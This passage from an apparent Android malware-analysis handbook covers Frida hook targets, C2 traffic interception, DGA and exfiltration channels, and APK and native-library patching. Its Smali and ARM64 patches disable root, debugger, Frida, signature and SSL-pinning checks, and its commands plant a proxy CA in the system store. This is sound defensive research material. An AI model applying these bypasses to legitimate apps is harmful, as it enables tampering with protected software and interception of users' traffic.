<code>Mac.doFinal</code> Dump keys and plaintext at the crypto API boundary Monitor SMS exfiltration <code>SmsManager.sendTextMessage</code>, <code>SmsManager.sendMultipartTextMessage</code> Catch outbound SMS used for OTP forwarding or premium abuse Track file system activity <code>File.$init</code>, <code>FileOutputStream.write</code>, <code>SharedPreferences.edit</code> Observe config drops, payload writes, and preference changes Capture screen recording <code>MediaProjection.createVirtualDisplay</code>, <code>ImageReader.acquireLatestImage</code> Detect VNC/screen streaming setup used by RAT families Monitor accessibility abuse <code>AccessibilityService.onAccessibilityEvent</code>, <code>performAction</code>, <code>performGlobalAction</code> Observe ATS commands (clicks, scrolls, gestures) during automated fraud Intercept dynamic loading <code>DexClassLoader.$init</code>, <code>InMemoryDexClassLoader.$init</code>, <code>ClassLoader.loadClass</code> Capture unpacked or stage-2 payloads at load time Track permission abuse <code>DevicePolicyManager.lockNow</code>, <code>DevicePolicyManager.resetPassword</code> Detect device admin abuse (screen lock, wipe threats) DNS/domain resolution <code>InetAddress.getByName</code>, <code>InetAddress.getAllByName</code> Capture DGA output or C2 domain resolution WebView injection <code>WebView.loadUrl</code>, <code>WebView.evaluateJavascript</code>, <code>WebViewClient.shouldInterceptRequest</code> Intercept injected phishing pages and JavaScript payloads Clipboard theft <code>ClipboardManager.setPrimaryClip</code>, <code>ClipboardManager.getPrimaryClip</code> Detect clipboard monitoring for crypto wallet address swapping"},{"location":"reversing/hooking/#tools","title":"Tools","text":"Tool Purpose Frida Runtime instrumentation reFrida Browser-based Frida IDE with visual interceptor builder, disassembler, and Stalker integration Objection Frida-powered automation (SSL bypass, root bypass, etc.) LSPosed Xposed framework for modern Android frida-dexdump Dump DEX from memory via Frida r2frida Radare2 + Frida integration medusa Extensible Frida wrapper for common hooking tasks"},{"location":"reversing/hooking/#ssl-pinning-current-state","title":"SSL Pinning: Current State","text":"<p>Google now recommends against SSL pinning in Android security best practices. 8kSec's analysis covers why: pinning is trivially bypassed with Frida, creates maintenance burden, and provides minimal security benefit for most threat models since the Android platform's certificate transparency and Play Integrity checks provide stronger guarantees. For malware analysis, pinning bypass remains a routine first step (see SSL Pinning Bypass above).</p>"},{"location":"reversing/network-analysis/","title":"Network Analysis","text":"<p>Intercepting, decrypting, and analyzing network traffic between the malware and its C2 server. Reveals command protocols, exfiltration channels, target lists, and infrastructure. Often the fastest path to understanding a sample's purpose and operator identity.</p>"},{"location":"reversing/network-analysis/#setup","title":"Setup","text":""},{"location":"reversing/network-analysis/#traffic-interception","title":"Traffic Interception","text":"Method Root Required HTTPS Notes Burp Suite / mitmproxy as Wi-Fi proxy No With cert install Standard approach. Set device proxy to host IP. iptables redirect Yes With cert install Transparent proxy. Catches traffic that ignores proxy settings. VPN-based (PCAPdroid, NetGuard) No Metadata only Captures packet headers without root. No decryption. tcpdump on device Yes No decryption Raw packet capture. Useful for non-HTTP protocols. Wireshark on host No No decryption Capture on shared network. Requires ARP spoofing or network tap."},{"location":"reversing/network-analysis/#certificate-installation","title":"Certificate Installation","text":"<p>For HTTPS interception, the proxy's CA certificate must be trusted by the device:</p> <p>User certificate store (Android 7+, apps targeting API 24+ ignore user certs by default):</p> <pre><code>adb push burp-ca.der /sdcard/\n# Settings &gt; Security &gt; Install from storage\n</code></pre> <p>System certificate store (requires root):</p> <pre><code>openssl x509 -inform DER -in burp-ca.der -out burp-ca.pem\nHASH=$(openssl x509 -inform PEM -subject_hash_old -in burp-ca.pem | head -1)\ncp burp-ca.pem /system/etc/security/cacerts/${HASH}.0\nchmod 644 /system/etc/security/cacerts/${HASH}.0\n</code></pre> <p>On Android 14+, system certs are read from an APEX module. Use Magisk's <code>MagiskTrustUserCerts</code> module or patch the APEX mount.</p>"},{"location":"reversing/network-analysis/#ssl-pinning-bypass","title":"SSL Pinning Bypass","text":"<p>Most banking trojans and their target apps implement SSL pinning. Bypass approaches ranked by reliability:</p> Approach Tool Scope Frida script See Hooking Per-library bypass (OkHttp, HttpURLConnection, WebView) Objection <code>android sslpinning disable</code> Automated, covers common libraries Network security config patch See Patching Modify <code>res/xml/network_security_config.xml</code> to trust user certs Frida + reFrida reFrida Visual interceptor for pinning bypass with real-time traffic view <p>For malware specifically, SSL pinning bypass is needed to observe C2 communication. Most malware uses simpler HTTP clients than legitimate apps, so a basic OkHttp or HttpURLConnection hook covers the majority.</p>"},{"location":"reversing/network-analysis/#c2-protocol-identification","title":"C2 Protocol Identification","text":"<p>Android malware C2 protocols fall into distinct categories. Identifying the protocol type determines the analysis approach:</p> Protocol Indicators Families HTTP/REST Standard HTTP methods, JSON/XML payloads, URL path structure Cerberus, Anubis, GodFather, Rafel RAT WebSocket <code>ws://</code> or <code>wss://</code> URLs, <code>Upgrade: websocket</code> header, persistent connection TsarBot, Antidot, BlankBot, BTMOB RAT, PJobRAT MQTT Port 1883/8883, CONNECT/PUBLISH/SUBSCRIBE packets Copybara Raw TCP Custom binary protocol, non-standard ports Albiriox (unencrypted TCP), SpyNote Firebase Cloud Messaging <code>fcm.googleapis.com</code>, JSON with <code>registration_ids</code> Vultur v2, PJobRAT, KoSpy, FireScam, DeVixor Firebase Firestore <code>firestore.googleapis.com</code>, document reads/writes KoSpy (C2 config delivery) Telegram Bot API <code>api.telegram.org/bot&lt;token&gt;/</code>, <code>sendMessage</code>/<code>getUpdates</code> Rafel RAT, Mamont, DeVixor TOR <code>.onion</code> domains, SOCKS proxy on port 9050 Hydra Dead drop resolvers Pastebin, Telegram channels, X (Twitter) posts containing encoded C2 addresses Medusa v2"},{"location":"reversing/network-analysis/#protocol-analysis-workflow","title":"Protocol Analysis Workflow","text":"<pre><code>1. Capture traffic (proxy or tcpdump)\n2. Identify protocol type from port/headers\n3. For HTTP: decode JSON payloads, map API endpoints\n4. For WebSocket: capture frame-by-frame, decode message format\n5. For custom protocols: identify packet structure (length prefix, command ID, payload)\n6. Map command set: what commands does the C2 send, what does the bot respond\n7. Extract IOCs: domains, IPs, paths, tokens, bot IDs\n</code></pre>"},{"location":"reversing/network-analysis/#domain-generation-algorithms-dga","title":"Domain Generation Algorithms (DGA)","text":"<p>Some families generate C2 domains algorithmically to resist infrastructure takedown:</p> Family DGA Type Predictability SharkBot Date-seeded domain generation Predictable with algorithm and seed Octo v2 Dynamic key-based DGA Requires key extraction MoqHao DNS hijacking (not DGA, but similar resilience) Requires DNS monitoring <p>To analyze a DGA: extract the algorithm from decompiled code, determine the seed (often date-based), and generate the domain list. This enables preemptive domain sinkholing.</p>"},{"location":"reversing/network-analysis/#exfiltration-channel-analysis","title":"Exfiltration Channel Analysis","text":"<p>Different families exfiltrate stolen data through different channels:</p> Channel What's Sent Families HTTP POST to C2 Credentials, SMS, contacts, device info Most banking trojans SFTP Files, documents, media DCHSpy Telegram Bot Screenshots, keylog dumps, SMS Rafel RAT, Mamont Firebase Realtime Database Real-time data streaming FireScam WebSocket streaming Live screen data, input events Vultur, BTMOB RAT AWS S3 (misconfigured) Exfiltrated victim data RedHook (exposed S3 bucket) VNC/AlphaVNC Screen streaming Vultur v1, BingoMod MediaProjection stream Screen recording/streaming Gigabud, BlankBot, BTMOB RAT"},{"location":"reversing/network-analysis/#traffic-encryption","title":"Traffic Encryption","text":"Encryption How to Decrypt Families Standard HTTPS Proxy with cert install + pinning bypass Most families Custom AES on top of HTTPS Hook <code>Cipher.doFinal</code> to capture plaintext Cerberus lineage Unencrypted HTTP/TCP No decryption needed Albiriox, older families Certificate pinning only Bypass pinning, traffic is readable Anatsa, Xenomorph TOR Run malware through transparent TOR proxy, or hook before TOR encryption Hydra Custom binary encoding Reverse the encoding algorithm from decompiled code Family-specific"},{"location":"reversing/network-analysis/#tools","title":"Tools","text":"Tool Purpose Burp Suite HTTP/HTTPS interception and modification mitmproxy Scriptable HTTPS proxy, good for automation PCAPdroid No-root Android traffic capture via local VPN Wireshark Packet-level protocol analysis tcpdump Command-line packet capture on device reFrida Browser-based Frida IDE with network activity monitoring"},{"location":"reversing/patching/","title":"Patching","text":"<p>Modifying an APK's code or resources, then repackaging and signing it for installation. Used to remove security checks (root detection, SSL pinning, integrity verification), inject instrumentation, or alter app behavior for analysis.</p>"},{"location":"reversing/patching/#workflow","title":"Workflow","text":""},{"location":"reversing/patching/#1-disassemble","title":"1. Disassemble","text":"<pre><code>apktool d target.apk -o target_patched/\n</code></pre> <p>This produces Smali code (Dalvik assembly), decoded resources, and the manifest.</p>"},{"location":"reversing/patching/#2-locate-target-code","title":"2. Locate Target Code","text":"<p>Find the code to patch. Common targets:</p> Target What to Search For Root detection \"su\", \"Superuser\", \"Magisk\", \"RootBeer\", <code>isRooted</code> SSL pinning \"CertificatePinner\", \"X509TrustManager\", \"SSL\", <code>checkServerTrusted</code> Emulator detection \"generic\", \"sdk\", \"Build.FINGERPRINT\", \"goldfish\" Integrity checks \"signature\", \"PackageInfo\", \"GET_SIGNATURES\" Debug detection \"isDebuggerConnected\", \"Debug.waitForDebugger\" Frida detection \"frida\", \"27042\", \"linjector\" <p>Use grep across the Smali directory:</p> <pre><code>grep -r \"isRooted\" target_patched/smali/\n</code></pre>"},{"location":"reversing/patching/#3-patch-smali","title":"3. Patch Smali","text":"<p>Smali is register-based Dalvik assembly. Common patches:</p> <p>Make a method always return true:</p> <pre><code>.method public isRooted()Z\n    .locals 1\n    const/4 v0, 0x1\n    return v0\n.end method\n</code></pre> <p>Make a method do nothing (NOP):</p> <pre><code>.method public checkIntegrity()V\n    .locals 0\n    return-void\n.end method\n</code></pre> <p>Change a conditional branch (replace the branch instruction with nop to prevent the jump):</p> <p>Original:</p> <pre><code>if-nez v0, :exit_app\n</code></pre> <p>Patched:</p> <pre><code>nop\n</code></pre>"},{"location":"reversing/patching/#4-reassemble","title":"4. Reassemble","text":"<pre><code>apktool b target_patched/ -o target_patched.apk\n</code></pre>"},{"location":"reversing/patching/#5-sign","title":"5. Sign","text":"<p>Android requires all APKs to be signed. Use a debug keystore or generate one:</p> <pre><code>keytool -genkey -v -keystore debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 10000 -storepass android -keypass android -dname \"CN=Debug\"\n\napksigner sign --ks debug.keystore --ks-key-alias debug --ks-pass pass:android target_patched.apk\n</code></pre>"},{"location":"reversing/patching/#6-install","title":"6. Install","text":"<pre><code>adb install target_patched.apk\n</code></pre> <p>If the original app is installed, uninstall first (signatures won't match):</p> <pre><code>adb uninstall com.target.app\nadb install target_patched.apk\n</code></pre>"},{"location":"reversing/patching/#common-patching-targets","title":"Common Patching Targets","text":"<p>A reference for the most frequent patching targets during malware analysis, organized by what you need to disable and where to find it:</p> Target Search Strings Smali Patch Purpose SSL pinning <code>CertificatePinner</code>, <code>checkServerTrusted</code>, <code>X509TrustManager</code> Replace <code>check</code> method body with <code>return-void</code> Intercept HTTPS traffic with a proxy Root detection <code>isRooted</code>, <code>RootBeer</code>, <code>su</code>, <code>Superuser</code>, <code>Magisk</code> Force <code>return false</code> (const/4 v0, 0x0) Run on rooted analysis device Emulator detection <code>Build.FINGERPRINT</code>, <code>generic</code>, <code>goldfish</code>, <code>sdk</code>, <code>isEmulator</code> Force <code>return false</code> or patch string comparisons Run in emulated environment Debug detection <code>isDebuggerConnected</code>, <code>Debug.waitForDebugger</code>, <code>TracerPid</code> Force <code>return false</code> or <code>return-void</code> Attach debugger for step-through analysis Frida detection <code>frida</code>, <code>27042</code>, <code>linjector</code>, <code>/proc/self/maps</code> Replace detection method with <code>return false</code> Allow Frida hooking without detection C2 URL replacement Encrypted or hardcoded C2 strings Replace C2 URL with controlled server address Redirect traffic to analyst-controlled infrastructure Geofencing <code>getSimCountryIso</code>, <code>getNetworkCountryIso</code>, locale checks Patch branch to always proceed, or replace country string Execute region-locked malware in analysis lab Kill switch Locale checks (CIS exclusion), date checks, remote kill NOP the kill branch or force the safe path Prevent self-termination during analysis Tamper detection <code>PackageManager.GET_SIGNATURES</code>, CRC checks, hash validation Replace verification method with constant <code>return true</code> Allow repackaged APK to run Device admin enforcement <code>DevicePolicyManager</code>, <code>isAdminActive</code> Bypass admin requirement branch Analyze without granting device admin"},{"location":"reversing/patching/#integrity-check-bypass","title":"Integrity Check Bypass","text":"<p>Malware frequently verifies its own integrity to detect tampering. After patching and re-signing, these checks will fire. Bypass them or the patched APK refuses to run.</p>"},{"location":"reversing/patching/#apk-signature-verification","title":"APK Signature Verification","text":"<p>The most common integrity check reads the APK's signing certificate at runtime and compares it against a hardcoded hash:</p> <pre><code>invoke-virtual {p0}, Landroid/content/Context;-&gt;getPackageManager()Landroid/content/pm/PackageManager;\nmove-result-object v0\ninvoke-virtual {p0}, Landroid/content/Context;-&gt;getPackageName()Ljava/lang/String;\nmove-result-object v1\nconst/16 v2, 0x40\ninvoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;-&gt;getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;\n</code></pre> <p>Patch approaches:</p> <p>1. NOP the entire check method:</p> <pre><code>.method private verifySignature()Z\n    .locals 1\n    const/4 v0, 0x1\n    return v0\n.end method\n</code></pre> <p>2. Patch the comparison to always match:</p> <p>Find the <code>String.equals()</code> or <code>Arrays.equals()</code> call that compares the signature hash and replace the conditional branch:</p> <p>Original:</p> <pre><code>if-eqz v0, :sig_mismatch\n</code></pre> <p>Patched:</p> <pre><code>goto :sig_valid\n</code></pre> <p>3. Replace the expected hash:</p> <p>If the malware stores the expected certificate hash as a string constant, replace it with the hash of your signing key:</p> <pre><code>keytool -exportcert -keystore debug.keystore -alias debug | sha256sum\n</code></pre> <p>Then patch the <code>const-string</code> in Smali with the new hash value.</p>"},{"location":"reversing/patching/#crc-checksum-verification","title":"CRC / Checksum Verification","text":"<p>Some malware computes CRC32 or SHA-256 over its own DEX file or specific resource files:</p> <pre><code>invoke-static {v0}, Ljava/util/zip/CRC32;-&gt;getValue()J\n</code></pre> <p>Patch strategies:</p> <ul> <li>Replace the CRC comparison with a constant <code>true</code> return</li> <li>Find where the expected CRC value is stored (often in a static field or resource file) and update it to match the patched binary</li> <li>NOP the entire <code>checkCRC</code> method body</li> </ul>"},{"location":"reversing/patching/#packagemanager-proxy-detection","title":"PackageManager Proxy Detection","text":"<p>Advanced malware doesn't just check the signature once -- it hooks into <code>PackageManager</code> calls throughout the app lifecycle. Some families create a wrapper around <code>getPackageInfo</code> that caches the result and checks it periodically.</p> <p>For these cases, search for all call sites:</p> <pre><code>grep -r \"GET_SIGNATURES\\|GET_SIGNING_CERTIFICATES\\|0x40\\|0x8000000\" target_patched/smali*/\n</code></pre> <p>Patch every verification call site, or replace the central verification utility method.</p>"},{"location":"reversing/patching/#native-signature-verification","title":"Native Signature Verification","text":"<p>When signature checks live in native code (<code>.so</code> files), Smali patching is not sufficient. The native library calls JNI functions to read the signature and verify it in C/C++. See the Binary Patching section below for handling these cases.</p>"},{"location":"reversing/patching/#binary-patching-native-libraries","title":"Binary Patching (Native Libraries)","text":"<p>When malware implements security checks, crypto routines, or core logic in native code (<code>.so</code> files), Smali patching is insufficient. Binary patching modifies the compiled ARM/ARM64 instructions directly.</p>"},{"location":"reversing/patching/#ghidra-workflow","title":"Ghidra Workflow","text":"<pre><code>1. Open the APK's lib/&lt;arch&gt;/ directory in Ghidra\n2. Import the target .so file (ELF format, ARM or AARCH64)\n3. Run auto-analysis (F5 for decompiler view)\n4. Locate the target function (JNI_OnLoad, anti-debug checks, etc.)\n5. Patch instructions using \"Patch Instruction\" (Ctrl+Shift+G)\n6. Export the patched binary (File &gt; Export Program &gt; ELF)\n7. Replace the original .so in the APK's lib/ directory\n</code></pre>"},{"location":"reversing/patching/#noping-anti-tamper-checks","title":"NOP'ing Anti-Tamper Checks","text":"<p>Native anti-tamper checks typically read <code>/proc/self/maps</code>, compute hashes, or call <code>ptrace</code> to detect debuggers. In ARM64, NOP is encoded as <code>0x1F2003D5</code>:</p> <p>Patching a branch in Ghidra:</p> <p>Find the conditional branch after the integrity check:</p> <pre><code>CBNZ X0, #anti_tamper_detected\n</code></pre> <p>Replace with NOP:</p> <pre><code>NOP\n</code></pre> <p>Or replace with an unconditional branch past the check:</p> <pre><code>B #continue_normal_execution\n</code></pre>"},{"location":"reversing/patching/#patching-jni_onload-anti-debug","title":"Patching JNI_OnLoad Anti-Debug","text":"<p>Many malware families run anti-debug and anti-tamper checks in <code>JNI_OnLoad</code>, which executes when the native library is loaded via <code>System.loadLibrary</code>. Common patterns:</p> Check in JNI_OnLoad What It Does Patch <code>ptrace(PTRACE_TRACEME, 0, 0, 0)</code> Self-trace to prevent debugger attach NOP the <code>ptrace</code> call and force return value to 0 <code>fopen(\"/proc/self/status\")</code> + <code>TracerPid</code> check Detect attached debugger via proc filesystem NOP the <code>fopen</code> call or patch the comparison <code>fopen(\"/proc/self/maps\")</code> + string scan Detect Frida, Xposed, or debugger libraries in memory NOP the scan loop or patch the string comparison <code>getpid()</code> + <code>kill(pid, 0)</code> timing check Detect debugging via execution timing NOP the timing check branch APK hash computation Verify APK hasn't been modified Replace hash comparison with unconditional success"},{"location":"reversing/patching/#ida-pro-keypatch-workflow","title":"IDA Pro + Keypatch Workflow","text":"<p>For IDA users, the Keypatch plugin simplifies binary patching:</p> <pre><code>1. Load .so in IDA, wait for auto-analysis\n2. Navigate to target instruction\n3. Edit &gt; Keypatch &gt; Patcher (or Ctrl+Alt+K)\n4. Enter replacement instruction (e.g., \"NOP\" or \"MOV W0, #1\")\n5. Apply patches: Edit &gt; Patch program &gt; Apply patches to input file\n</code></pre>"},{"location":"reversing/patching/#replacing-the-patched-library","title":"Replacing the Patched Library","text":"<p>After patching, place the modified <code>.so</code> back into the APK:</p> <pre><code>apktool d target.apk -o target_patched/\ncp patched_libnative.so target_patched/lib/arm64-v8a/libnative.so\napktool b target_patched/ -o target_patched.apk\nuber-apk-signer -a target_patched.apk\n</code></pre> <p>Patch all architectures the APK ships (arm64-v8a, armeabi-v7a, x86, x86_64) or remove the directories for architectures you don't need -- Android will skip missing ABIs and fall back to available ones.</p>"},{"location":"reversing/patching/#automated-patching-tools","title":"Automated Patching Tools","text":"<p>Manual Smali editing is precise but slow. These tools automate common patching workflows:</p>"},{"location":"reversing/patching/#apktool-uber-apk-signer","title":"apktool + uber-apk-signer","text":"<p>The standard manual workflow, streamlined:</p> <pre><code>apktool d target.apk -o target_patched/\napktool b target_patched/ -o target_patched.apk\nuber-apk-signer -a target_patched.apk\nadb install target_patched-aligned-debugSigned.apk\n</code></pre> <p>uber-apk-signer handles zipalign + signing in one step, supports v1/v2/v3 signature schemes, and auto-generates a debug keystore if none is provided.</p>"},{"location":"reversing/patching/#objection-patchapk","title":"Objection patchapk","text":"<p>Objection can inject Frida Gadget into an APK automatically:</p> <pre><code>objection patchapk -s target.apk\n</code></pre> <p>This decompiles the APK, injects the Frida Gadget <code>.so</code> into the native library directory, adds a <code>System.loadLibrary</code> call in the entry activity, repackages, and signs. The result is a self-instrumenting APK that spawns a Frida listener on launch without needing frida-server or root.</p> <p>Options:</p> <pre><code>objection patchapk -s target.apk -a arm64-v8a\nobjection patchapk -s target.apk --gadget-version 16.1.0\nobjection patchapk -s target.apk -c gadget-config.json\n</code></pre> <p>The gadget config file controls Frida's behavior (listen mode, script to load, interaction type):</p> <pre><code>{\n  \"interaction\": {\n    \"type\": \"script\",\n    \"path\": \"/data/local/tmp/hook.js\"\n  }\n}\n</code></pre>"},{"location":"reversing/patching/#reflutter-flutter-apps","title":"reflutter (Flutter Apps)","text":"<p>reflutter patches Flutter-based apps to disable SSL pinning and enable traffic interception:</p> <pre><code>reflutter target.apk\n</code></pre> <p>reflutter patches the <code>libflutter.so</code> binary to redirect SSL verification and can also set up a MITM proxy configuration. This is necessary because Flutter apps use their own TLS stack (BoringSSL compiled into <code>libflutter.so</code>) and ignore system-level proxy settings and certificate stores.</p>"},{"location":"reversing/patching/#apklab-vs-code-extension","title":"APKLab (VS Code Extension)","text":"<p>APKLab integrates apktool, jadx, and signing into VS Code. Right-click to decompile, edit Smali with syntax highlighting, and rebuild with one click. Useful for iterative patching workflows where you need to patch, test, and re-patch multiple times.</p>"},{"location":"reversing/patching/#common-pitfalls","title":"Common Pitfalls","text":""},{"location":"reversing/patching/#signature-verification","title":"Signature Verification","text":"<p>Many apps verify their own signature at runtime:</p> <pre><code>PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_SIGNATURES);\nString sig = info.signatures[0].toCharsString();\nif (!sig.equals(EXPECTED_SIGNATURE)) { System.exit(0); }\n</code></pre> <p>After repackaging with a different key, this check fails. See the Integrity Check Bypass section above for patching strategies, or hook <code>PackageManager.getPackageInfo()</code> via Frida.</p>"},{"location":"reversing/patching/#multi-dex","title":"Multi-DEX","text":"<p>Large apps have multiple DEX files (<code>classes.dex</code>, <code>classes2.dex</code>, etc.). The target code may be in any of them. apktool handles this automatically, but search across all Smali directories:</p> <pre><code>grep -r \"targetMethod\" target_patched/smali*/\n</code></pre>"},{"location":"reversing/patching/#native-integrity-checks","title":"Native Integrity Checks","text":"<p>Native libraries (<code>.so</code> files) may verify DEX checksums or APK signatures. See the Binary Patching section above for handling these with Ghidra or IDA.</p>"},{"location":"reversing/patching/#resource-id-conflicts","title":"Resource ID Conflicts","text":"<p>Modifying resources can shift resource IDs, breaking references. Prefer code-only patches when possible.</p>"},{"location":"reversing/patching/#smali-basics","title":"Smali Basics","text":"<p>Quick reference for reading and writing Smali:</p> Smali Meaning <code>v0</code>, <code>v1</code> Local registers <code>p0</code>, <code>p1</code> Parameter registers (p0 = <code>this</code> for instance methods) <code>const/4 v0, 0x0</code> Set v0 to 0 (false) <code>const/4 v0, 0x1</code> Set v0 to 1 (true) <code>return v0</code> Return value in v0 <code>return-void</code> Return nothing <code>invoke-virtual</code> Call instance method <code>invoke-static</code> Call static method <code>move-result v0</code> Get return value of last invoke <code>if-eqz v0, :label</code> Jump to label if v0 == 0 <code>if-nez v0, :label</code> Jump to label if v0 != 0 <code>goto :label</code> Unconditional jump"},{"location":"reversing/patching/#tools","title":"Tools","text":"Tool Purpose apktool Disassemble/reassemble APKs apksigner Sign APKs (Android SDK) uber-apk-signer Simplified APK signing (zipalign + sign in one step) Ghidra Native code analysis and binary patching Keypatch Binary patching plugin for IDA Objection Automated Frida Gadget injection into APKs reflutter SSL pinning bypass for Flutter apps APKLab VS Code extension integrating apktool, jadx, and signing"},{"location":"reversing/patching/#family-specific-patching-scenarios","title":"Family-Specific Patching Scenarios","text":"<p>Malware analysis often requires patching specific protection mechanisms before analysis can proceed:</p> Family What to Patch Why Chameleon Biometric prompt bypass check Force PIN/password input path to study credential capture mechanism Cerberus lineage Geofencing kill switch Remove CIS country exclusion list to allow execution in analysis environments Klopatra Virbox unpacking stub Patch the native loader to dump DEX before execution, bypassing VM interpretation Brokewell Android 13+ restriction bypass loader Patch the loader's <code>SessionInstaller</code> calls to study the payload directly Frogblight Geofencing check Remove US-avoidance SIM/locale check to allow execution outside Turkey GodFather Post-Soviet language kill switch Patch out system locale check that prevents execution on Russian/Ukrainian devices TrickMo JSONPacker unpacking Patch the custom packer's decryption routine to dump the cleartext payload Mandrake OLLVM control flow flattening Patch branch conditions in native code to linearize execution flow for analysis"},{"location":"reversing/patching/#patching-geofencing","title":"Patching Geofencing","text":"<p>Many banking trojans restrict execution to specific regions. The geofence check typically reads the SIM country code or device locale:</p> <pre><code>invoke-virtual {p0}, Landroid/telephony/TelephonyManager;-&gt;getSimCountryIso()Ljava/lang/String;\nmove-result-object v0\nconst-string v1, \"tr\"\ninvoke-virtual {v0, v1}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z\nmove-result v0\nif-eqz v0, :not_target_country\n</code></pre> <p>To bypass, patch the conditional branch to always proceed, or replace the country code comparison string with your analysis environment's locale.</p>"},{"location":"reversing/patching/#patching-anti-frida-checks","title":"Patching Anti-Frida Checks","text":"<p>Malware detecting Frida (see Hooking) can be patched at the Smali level instead of hooking:</p> <pre><code>.method private checkFrida()Z\n    .locals 1\n    const/4 v0, 0x0\n    return v0\n.end method\n</code></pre> <p>Replace the entire method body with a constant <code>false</code> return. This avoids the cat-and-mouse game of hook-based Frida hiding.</p>"},{"location":"reversing/patching/#when-to-patch-vs-hook","title":"When to Patch vs. Hook","text":"Situation Prefer Persistent change needed Patch Exploring/investigating Hook (Frida) Many checks to bypass Hook (one script, multiple hooks) Native code checks Either (Frida can hook native too) No root access available Patch (works on non-rooted device) App uses integrity verification Hook (avoid signature mismatch) Geofencing / kill switch bypass Patch (one-time removal is cleaner) Frida detection that's hard to hook Patch (remove detection entirely)"},{"location":"reversing/static-analysis/","title":"Static Analysis","text":"<p>Examining an APK without executing it. The first step in any Android reverse engineering workflow: extract the APK, read the manifest, decompile the code, and identify protections, permissions, and interesting code paths.</p>"},{"location":"reversing/static-analysis/#workflow","title":"Workflow","text":""},{"location":"reversing/static-analysis/#0-virustotal-triage","title":"0. VirusTotal Triage","text":"<p>Before deep analysis, submit the sample to VirusTotal for multi-engine scanning. This provides an immediate overview:</p> <pre><code>Upload APK -&gt; Check detection ratio -&gt; Review vendor names -&gt; Check \"Details\" tab\n</code></pre> <p>What to extract from VT results:</p> Tab What to Look For Detection Detection ratio, family names from ESET/Kaspersky/ThreatFabric, ignore generic \"Trojan.Gen\" verdicts Details Target SDK, signing certificate, embedded file types, APKiD results (packers/obfuscators) Relations Contacted domains/IPs (C2 infrastructure), downloaded files, embedded URLs Behavior Sandbox execution results: permissions requested, network connections, file system activity Community Researcher comments, YARA rule matches, tags <p>Interpreting detection names: different engines name the same family differently. See Naming Conventions for the full cross-vendor mapping. In practice, check ESET, Kaspersky, and Bitdefender names first as they have the most consistent Android family attribution.</p> <p>If the APK is packed, the \"Details\" tab shows APKiD results revealing the packer. Detection counts may be lower for packed samples since engines scan the packer stub, not the actual payload.</p> <p>For VT Intelligence users: search by <code>content:{hash}</code>, <code>imphash:</code>, or behavioral indicators like <code>behaviour_network:domain</code> to find related samples and track campaigns.</p>"},{"location":"reversing/static-analysis/#1-apk-extraction","title":"1. APK Extraction","text":"<p>Get the APK from the device:</p> <pre><code>adb shell pm list packages | grep target\nadb shell pm path com.target.app\nadb pull /data/app/com.target.app-XXX/base.apk\n</code></pre> <p>For split APKs (common on Android 5+):</p> <pre><code>adb shell pm path com.target.app\n# Returns multiple paths: base.apk, split_config.*.apk\n</code></pre>"},{"location":"reversing/static-analysis/#2-manifest-review","title":"2. Manifest Review","text":"<p>The <code>AndroidManifest.xml</code> reveals the most about an app before looking at code:</p> <pre><code>apktool d base.apk -o output/\ncat output/AndroidManifest.xml\n</code></pre> <p>What to look for:</p> Element Significance <code>&lt;uses-permission&gt;</code> What data/capabilities the app requests <code>&lt;service&gt;</code> with accessibility Indicates potential device control capability <code>&lt;receiver&gt;</code> for BOOT_COMPLETED Persistence mechanism <code>android:exported=\"true\"</code> Components accessible to other apps <code>&lt;provider&gt;</code> without permission Potentially exposed data <code>taskAffinity</code> on activities Possible task hijacking <code>android:debuggable=\"true\"</code> Debug build, easier to instrument <code>android:allowBackup=\"true\"</code> Data extractable via adb backup Custom permissions App-defined access controls"},{"location":"reversing/static-analysis/#3-decompilation","title":"3. Decompilation","text":"<p>DEX to Java (readable but imperfect):</p> <pre><code>jadx base.apk -d output_java/\n</code></pre> <p>jadx produces readable Java approximations. Works well for most unprotected apps. Struggles with heavy obfuscation or packed code.</p> <p>DEX to Smali (accurate but harder to read):</p> <pre><code>apktool d base.apk -o output_smali/\n</code></pre> <p>apktool disassembles to Smali (Dalvik assembly). Preserves all code structure. Required for patching.</p>"},{"location":"reversing/static-analysis/#4-packer-identification","title":"4. Packer Identification","text":"<p>Run APKiD to identify protections:</p> <pre><code>apkid base.apk\n</code></pre> <p>Output reveals:</p> <ul> <li>Packer/protector used (Bangcle, Tencent, Virbox, DexProtector, etc.)</li> <li>Obfuscator (ProGuard, R8, Allatori, etc.)</li> <li>Anti-analysis techniques detected</li> <li>Compiler used</li> </ul> <p>If the app is packed, static analysis of the DEX code shows only the packer stub. The real code is encrypted and only available at runtime. Move to Dynamic Analysis or packer-specific unpacking techniques in Packers.</p>"},{"location":"reversing/static-analysis/#5-string-extraction","title":"5. String Extraction","text":"<p>Strings reveal C2 URLs, API endpoints, encryption keys, and debug messages:</p> <pre><code>strings base.apk | grep -i \"http\"\nstrings base.apk | grep -i \"api\"\n</code></pre> <p>In jadx, search across all decompiled sources for:</p> <ul> <li>URLs and IP addresses</li> <li>Hardcoded credentials or API keys</li> <li>Package names of target apps (for overlay malware)</li> <li>Packer-specific strings</li> <li>Base64-encoded blobs (may contain configuration)</li> </ul>"},{"location":"reversing/static-analysis/#6-resource-analysis","title":"6. Resource Analysis","text":"<p>Resources (<code>res/</code>) can contain:</p> Resource Contains <code>res/xml/</code> Network security config, accessibility config, file provider paths <code>res/raw/</code> Embedded files, encrypted payloads, configuration <code>assets/</code> Native libraries, packed DEX files, web content for overlays <code>res/values/strings.xml</code> Hardcoded strings, sometimes sensitive <p>The network security config (<code>res/xml/network_security_config.xml</code>) reveals certificate pinning configuration and trusted CAs.</p>"},{"location":"reversing/static-analysis/#7-native-code","title":"7. Native Code","text":"<p>If the APK contains <code>.so</code> files in <code>lib/</code>:</p> <pre><code>file lib/arm64-v8a/libnative.so\n</code></pre> <p>Native libraries may contain:</p> <ul> <li>Unpacking logic (common in packed apps)</li> <li>Anti-tampering checks</li> <li>Cryptographic operations</li> <li>JNI bridges to obfuscated functionality</li> </ul> <p>Use Ghidra, IDA Pro, or Binary Ninja for native code analysis. Function names are often stripped, requiring pattern matching and dynamic analysis to map functionality.</p>"},{"location":"reversing/static-analysis/#family-specific-static-analysis-notes","title":"Family-Specific Static Analysis Notes","text":"<p>Different malware families present unique static analysis challenges. The table below maps families to their specific obstacles and recommended 